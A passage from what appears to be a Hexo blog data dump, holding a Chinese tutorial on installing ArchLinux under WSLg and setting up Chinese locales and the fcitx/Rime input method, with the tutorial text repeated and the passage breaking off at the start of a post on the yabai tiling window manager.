wsl 子系统，比如我现在安装的 ArchLinux。</p>\n<p>如果你配置了 Windows 的包管理器比如 Scoop ，那就简单了，一条命令搞定</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop install lxrunoffline</span><br></pre></td></tr></table></figure>\n\n<p>不然就手工下安装包吧，下载地址：<a href=\"https://github.com/DDoSolitary/LxRunOffline/releases\">https://github.com/DDoSolitary/LxRunOffline/releases</a></p>\n<p>选择最新版下载，解压后将 LxRunOffline.exe 放入任意一个 path 文件夹下（比如 C:&#x2F;Windows&#x2F;System32）</p>\n<h2 id=\"下载-ArchLinux\"><a href=\"#下载-ArchLinux\" class=\"headerlink\" title=\"下载 ArchLinux\"></a>下载 ArchLinux</h2><p>下载地址：<a href=\"https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/\">https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/</a></p>\n<p>不管选择什么版本，记得需要的格式是 <code>tar.gz</code> 文件。</p>\n<p>准备工作完成，下面开始正式安装.</p>\n<h1 id=\"安装-ArchLinux-到-WSLg\"><a href=\"#安装-ArchLinux-到-WSLg\" class=\"headerlink\" title=\"安装 ArchLinux 到 WSLg\"></a>安装 ArchLinux 到 WSLg</h1><h2 id=\"安装镜像\"><a href=\"#安装镜像\" class=\"headerlink\" title=\"安装镜像\"></a>安装镜像</h2><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LxRunOffline i <span class=\"literal\">-n</span> &lt;自定义名称&gt; <span class=\"operator\">-f</span> &lt;Arch镜像位置&gt; <span class=\"literal\">-d</span> &lt;安装系统的位置&gt; <span class=\"literal\">-r</span> root.x86_64</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"设置为-WSL2\"><a href=\"#设置为-WSL2\" class=\"headerlink\" title=\"设置为 WSL2\"></a>设置为 WSL2</h2><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">--set-version</span> &lt;名称&gt; <span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"进入系统\"><a href=\"#进入系统\" class=\"headerlink\" title=\"进入系统\"></a>进入系统</h2><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">-d</span> &lt;名字&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如果你只安装了一个子系统，那么只输入 <code>wsl</code> 会自动进入默认的子系统中。</p>\n<p>PS：WSL 一般的管理命令</p>\n<p>查看安装的子系统和对应版本</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">-l</span> <span class=\"literal\">-v</span></span><br></pre></td></tr></table></figure>\n\n<p>关闭某个子系统</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">--shutdown</span> &lt;名字&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"以下操作在子系统中进行\"><a href=\"#以下操作在子系统中进行\" class=\"headerlink\" title=\"以下操作在子系统中进行\"></a>以下操作在子系统中进行</h2><p>编辑镜像源</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /etc/</span><br></pre></td></tr></table></figure>\n\n<p>用 windows 的文件管理器打开&#x2F;etc 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">explorer.exe .</span><br></pre></td></tr></table></figure>\n\n<p>编辑 &#x2F;etc&#x2F;pacman.conf 文件，在最后加入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[archlinuxcn]</span><br><span class=\"line\">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class=\"variable\">$arch</span></span><br></pre></td></tr></table></figure>\n\n<p>编辑 &#x2F;etc&#x2F;pacman.d&#x2F;mirrolist 文件，选择一些 China 的源，将源注释去掉（选择部分即可），譬如我选择的是清华源：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</span></span><br><span class=\"line\">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/<span class=\"variable\">$repo</span>/os/<span class=\"variable\">$arch</span></span><br></pre></td></tr></table></figure>\n\n<p>更新系统，依次执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 更新</span></span><br><span class=\"line\">pacman -Syy</span><br><span class=\"line\"></span><br><span class=\"line\">pacman-key --init</span><br><span class=\"line\"></span><br><span class=\"line\">pacman-key --populate</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加 archlinuxcn 的keyring</span></span><br><span class=\"line\">pacman -S archlinuxcn-keyring</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装 sudo vim yay 等软件</span></span><br><span class=\"line\">pacman -S base base-devel vim git yay</span><br></pre></td></tr></table></figure>\n\n<p>给 root 用户添加密码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">passwd</span><br></pre></td></tr></table></figure>\n\n<p>添加一个普通用户并设置密码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">useradd -m -g wheel &lt;用户名&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">passwd</span><br></pre></td></tr></table></figure>\n\n<p>编辑文件 &#x2F;etc&#x2F;sudoers ，去掉 %wheel ALL&#x3D;(ALL) ALL 的注释</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/sudoers</span><br></pre></td></tr></table></figure>\n\n<p>查看普通用户 id：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">id</span> -u &lt;用户名&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"设置进入子系统时使用普通用户\"><a href=\"#设置进入子系统时使用普通用户\" class=\"headerlink\" title=\"设置进入子系统时使用普通用户\"></a>设置进入子系统时使用普通用户</h2><p>在 powershell 中执行：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lxrunoffline su <span class=\"literal\">-n</span> &lt;子系统名字&gt; <span class=\"literal\">-v</span> &lt;账户id&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这样初步的设置就完成了。</p>\n<h1 id=\"安装中文支持和中文输入法\"><a href=\"#安装中文支持和中文输入法\" class=\"headerlink\" title=\"安装中文支持和中文输入法\"></a>安装中文支持和中文输入法</h1><h2 id=\"中文支持\"><a href=\"#中文支持\" class=\"headerlink\" title=\"中文支持\"></a>中文支持</h2><ol>\n<li>安装中文 Locale</li>\n</ol>\n<p>修改&#x2F;etc&#x2F;locale.gen 文件，取消对应项之前的注释符</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/locale.gen</span><br></pre></td></tr></table></figure>\n\n<p>我目前只启用了两个</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">en_US.UTF-8 UTF-8</span><br><span class=\"line\">zh_CN.GBK GBK</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>启用中文 locale</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo locale-gen</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装中文字体</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S wqy-zenhei</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"中文输入法\"><a href=\"#中文输入法\" class=\"headerlink\" title=\"中文输入法\"></a>中文输入法</h2><p>就是这一步卡了我好久，试过 ibus，fcitx， fcitx5，开始时怎么都调用不了输入法，最后还是选择了 fcitx，不过要额外下载一个 dbus-x11。</p>\n<ol>\n<li>必要软件和输入法，我本人使用 Rime，可换成其他的</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S fcitx fcitx-configtool fcitx-rime</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>切换到 root 用户生成 dbus 机器码</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dbus-uuidgen &gt; /var/lib/dbus/machine-id</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装 dbus-x11</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yay dbus-x11</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>配置输入环境</li>\n</ol>\n<p>将以下内容添加到 ~&#x2F;.bashrc 配置文件中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> GTK_IM_MODULE=fcitx</span><br><span class=\"line\"><span class=\"built_in\">export</span> QT_IM_MODULE=fcitx</span><br><span class=\"line\"><span class=\"built_in\">export</span> XMODIFIERS=@im=fcitx</span><br><span class=\"line\"><span class=\"built_in\">export</span> DefaultIMModule=fcitx</span><br><span class=\"line\"><span class=\"comment\"># fcitx 自启</span></span><br><span class=\"line\">fcitx-autostart &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.bashrc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>bash 输入 fcitx-configtool ，配置输入法。</p>\n<p>然后就可以在 gui 程序中使用中文输入法啦。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://www.cnblogs.com/kainhuck/p/13835833.html\">在 WSL2 中安装 ArchLinux</a></li>\n<li><a href=\"http://ocdman.github.io/2017/11/22/Arch%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%E5%AD%97%E4%BD%93%E4%BB%A5%E5%8F%8A%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/\">Arch 支持中文字体以及安装中文输入法</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/407555801\">WSL2-不输 Mac 的开发体验（一）：WSL2 的安装及基本配置</a></li>\n<li><a href=\"https://blog.csdn.net/sinat_33528967/article/details/97611020archlinux%E4%B8%ADfcitx%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98\">archlinux 中 fcitx 安装配置与常见问题</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>经过多次尝试，我终于成功在 WSLg(Windows Subsystem for Linux GUI) 上成功安装了 ArchLinux 并配置了中文输入法，真是令人唏嘘，特别是卡在配置中文输入法上一两个星期真是令人感到非常气馁。</p>\n<p>所幸我终于成功了，本文就是在 ArchLinux on WSLg 上编写的，现在既可以愉快地玩游戏又可以码代码同时不用在 Windows 上配置恶心的环境了（没错，我再也不想体验在 windows 上配置环境变量等等繁琐的东西了）。</p>","more":"<h1 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h1><p>首先要做的准备就是启用 WSLg 了。由于我装的系统是 Windows11，所以对于版本什么的倒是不用担心，但是要注意 **WSLg 的 Windows 操作系统版本要求是 21362+**，可以使用 win+r 输入 winver 查看版本。</p>\n<h2 id=\"启用-wsl\"><a href=\"#启用-wsl\" class=\"headerlink\" title=\"启用 wsl\"></a>启用 wsl</h2><p>用管理员打开 powershell 输入</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dism.exe /online /<span class=\"built_in\">enable-feature</span> /featurename:Microsoft<span class=\"literal\">-Windows-Subsystem-Linux</span> /all /norestart</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"启用虚拟平台\"><a href=\"#启用虚拟平台\" class=\"headerlink\" title=\"启用虚拟平台\"></a>启用虚拟平台</h2><p>用管理员打开 powershell 输入</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dism.exe /online /<span class=\"built_in\">enable-feature</span> /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"将-WSL2-设置为默认版本\"><a href=\"#将-WSL2-设置为默认版本\" class=\"headerlink\" title=\"将 WSL2 设置为默认版本\"></a>将 WSL2 设置为默认版本</h2><p>（不知道为什么我设置了安装的系统还是 WSL1）用管理员打开 powershell 输入</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">--set-default-version</span> <span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"更新到-WSLg\"><a href=\"#更新到-WSLg\" class=\"headerlink\" title=\"更新到 WSLg\"></a>更新到 WSLg</h2><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">--update</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装-LxRunOffline\"><a href=\"#安装-LxRunOffline\" class=\"headerlink\" title=\"安装 LxRunOffline\"></a>安装 LxRunOffline</h2><p>这是个很好用的 wsl 管理工具，可以用来安装没有微软官方支持的 wsl 子系统，比如我现在安装的 ArchLinux。</p>\n<p>如果你配置了 Windows 的包管理器比如 Scoop ，那就简单了，一条命令搞定</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop install lxrunoffline</span><br></pre></td></tr></table></figure>\n\n<p>不然就手工下安装包吧，下载地址：<a href=\"https://github.com/DDoSolitary/LxRunOffline/releases\">https://github.com/DDoSolitary/LxRunOffline/releases</a></p>\n<p>选择最新版下载，解压后将 LxRunOffline.exe 放入任意一个 path 文件夹下（比如 C:&#x2F;Windows&#x2F;System32）</p>\n<h2 id=\"下载-ArchLinux\"><a href=\"#下载-ArchLinux\" class=\"headerlink\" title=\"下载 ArchLinux\"></a>下载 ArchLinux</h2><p>下载地址：<a href=\"https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/\">https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/</a></p>\n<p>不管选择什么版本，记得需要的格式是 <code>tar.gz</code> 文件。</p>\n<p>准备工作完成，下面开始正式安装.</p>\n<h1 id=\"安装-ArchLinux-到-WSLg\"><a href=\"#安装-ArchLinux-到-WSLg\" class=\"headerlink\" title=\"安装 ArchLinux 到 WSLg\"></a>安装 ArchLinux 到 WSLg</h1><h2 id=\"安装镜像\"><a href=\"#安装镜像\" class=\"headerlink\" title=\"安装镜像\"></a>安装镜像</h2><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LxRunOffline i <span class=\"literal\">-n</span> &lt;自定义名称&gt; <span class=\"operator\">-f</span> &lt;Arch镜像位置&gt; <span class=\"literal\">-d</span> &lt;安装系统的位置&gt; <span class=\"literal\">-r</span> root.x86_64</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"设置为-WSL2\"><a href=\"#设置为-WSL2\" class=\"headerlink\" title=\"设置为 WSL2\"></a>设置为 WSL2</h2><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">--set-version</span> &lt;名称&gt; <span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"进入系统\"><a href=\"#进入系统\" class=\"headerlink\" title=\"进入系统\"></a>进入系统</h2><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">-d</span> &lt;名字&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如果你只安装了一个子系统，那么只输入 <code>wsl</code> 会自动进入默认的子系统中。</p>\n<p>PS：WSL 一般的管理命令</p>\n<p>查看安装的子系统和对应版本</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">-l</span> <span class=\"literal\">-v</span></span><br></pre></td></tr></table></figure>\n\n<p>关闭某个子系统</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">--shutdown</span> &lt;名字&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"以下操作在子系统中进行\"><a href=\"#以下操作在子系统中进行\" class=\"headerlink\" title=\"以下操作在子系统中进行\"></a>以下操作在子系统中进行</h2><p>编辑镜像源</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /etc/</span><br></pre></td></tr></table></figure>\n\n<p>用 windows 的文件管理器打开&#x2F;etc 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">explorer.exe .</span><br></pre></td></tr></table></figure>\n\n<p>编辑 &#x2F;etc&#x2F;pacman.conf 文件，在最后加入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[archlinuxcn]</span><br><span class=\"line\">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class=\"variable\">$arch</span></span><br></pre></td></tr></table></figure>\n\n<p>编辑 &#x2F;etc&#x2F;pacman.d&#x2F;mirrolist 文件，选择一些 China 的源，将源注释去掉（选择部分即可），譬如我选择的是清华源：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</span></span><br><span class=\"line\">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/<span class=\"variable\">$repo</span>/os/<span class=\"variable\">$arch</span></span><br></pre></td></tr></table></figure>\n\n<p>更新系统，依次执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 更新</span></span><br><span class=\"line\">pacman -Syy</span><br><span class=\"line\"></span><br><span class=\"line\">pacman-key --init</span><br><span class=\"line\"></span><br><span class=\"line\">pacman-key --populate</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加 archlinuxcn 的keyring</span></span><br><span class=\"line\">pacman -S archlinuxcn-keyring</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装 sudo vim yay 等软件</span></span><br><span class=\"line\">pacman -S base base-devel vim git yay</span><br></pre></td></tr></table></figure>\n\n<p>给 root 用户添加密码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">passwd</span><br></pre></td></tr></table></figure>\n\n<p>添加一个普通用户并设置密码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">useradd -m -g wheel &lt;用户名&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">passwd</span><br></pre></td></tr></table></figure>\n\n<p>编辑文件 &#x2F;etc&#x2F;sudoers ，去掉 %wheel ALL&#x3D;(ALL) ALL 的注释</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/sudoers</span><br></pre></td></tr></table></figure>\n\n<p>查看普通用户 id：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">id</span> -u &lt;用户名&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"设置进入子系统时使用普通用户\"><a href=\"#设置进入子系统时使用普通用户\" class=\"headerlink\" title=\"设置进入子系统时使用普通用户\"></a>设置进入子系统时使用普通用户</h2><p>在 powershell 中执行：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lxrunoffline su <span class=\"literal\">-n</span> &lt;子系统名字&gt; <span class=\"literal\">-v</span> &lt;账户id&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这样初步的设置就完成了。</p>\n<h1 id=\"安装中文支持和中文输入法\"><a href=\"#安装中文支持和中文输入法\" class=\"headerlink\" title=\"安装中文支持和中文输入法\"></a>安装中文支持和中文输入法</h1><h2 id=\"中文支持\"><a href=\"#中文支持\" class=\"headerlink\" title=\"中文支持\"></a>中文支持</h2><ol>\n<li>安装中文 Locale</li>\n</ol>\n<p>修改&#x2F;etc&#x2F;locale.gen 文件，取消对应项之前的注释符</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/locale.gen</span><br></pre></td></tr></table></figure>\n\n<p>我目前只启用了两个</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">en_US.UTF-8 UTF-8</span><br><span class=\"line\">zh_CN.GBK GBK</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>启用中文 locale</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo locale-gen</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装中文字体</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S wqy-zenhei</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"中文输入法\"><a href=\"#中文输入法\" class=\"headerlink\" title=\"中文输入法\"></a>中文输入法</h2><p>就是这一步卡了我好久，试过 ibus，fcitx， fcitx5，开始时怎么都调用不了输入法，最后还是选择了 fcitx，不过要额外下载一个 dbus-x11。</p>\n<ol>\n<li>必要软件和输入法，我本人使用 Rime，可换成其他的</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S fcitx fcitx-configtool fcitx-rime</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>切换到 root 用户生成 dbus 机器码</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dbus-uuidgen &gt; /var/lib/dbus/machine-id</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装 dbus-x11</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yay dbus-x11</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>配置输入环境</li>\n</ol>\n<p>将以下内容添加到 ~&#x2F;.bashrc 配置文件中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> GTK_IM_MODULE=fcitx</span><br><span class=\"line\"><span class=\"built_in\">export</span> QT_IM_MODULE=fcitx</span><br><span class=\"line\"><span class=\"built_in\">export</span> XMODIFIERS=@im=fcitx</span><br><span class=\"line\"><span class=\"built_in\">export</span> DefaultIMModule=fcitx</span><br><span class=\"line\"><span class=\"comment\"># fcitx 自启</span></span><br><span class=\"line\">fcitx-autostart &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.bashrc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>bash 输入 fcitx-configtool ，配置输入法。</p>\n<p>然后就可以在 gui 程序中使用中文输入法啦。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://www.cnblogs.com/kainhuck/p/13835833.html\">在 WSL2 中安装 ArchLinux</a></li>\n<li><a href=\"http://ocdman.github.io/2017/11/22/Arch%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%E5%AD%97%E4%BD%93%E4%BB%A5%E5%8F%8A%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/\">Arch 支持中文字体以及安装中文输入法</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/407555801\">WSL2-不输 Mac 的开发体验（一）：WSL2 的安装及基本配置</a></li>\n<li><a href=\"https://blog.csdn.net/sinat_33528967/article/details/97611020archlinux%E4%B8%ADfcitx%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98\">archlinux 中 fcitx 安装配置与常见问题</a></li>\n</ul>"},{"layout":"pages","title":"macOS平铺式桌面尝鲜","date":"2023-06-24T11:54:24.000Z","_content":"\n在使用了 sway 桌面后，我觉得平铺式桌面好像更好，不会说需要想办法调整打开的窗口布局，然后在 b 站刷到了关注的 up 主介绍的 macOS 上的平铺式桌面 yabai，虽然官方文档写的是最新支持到 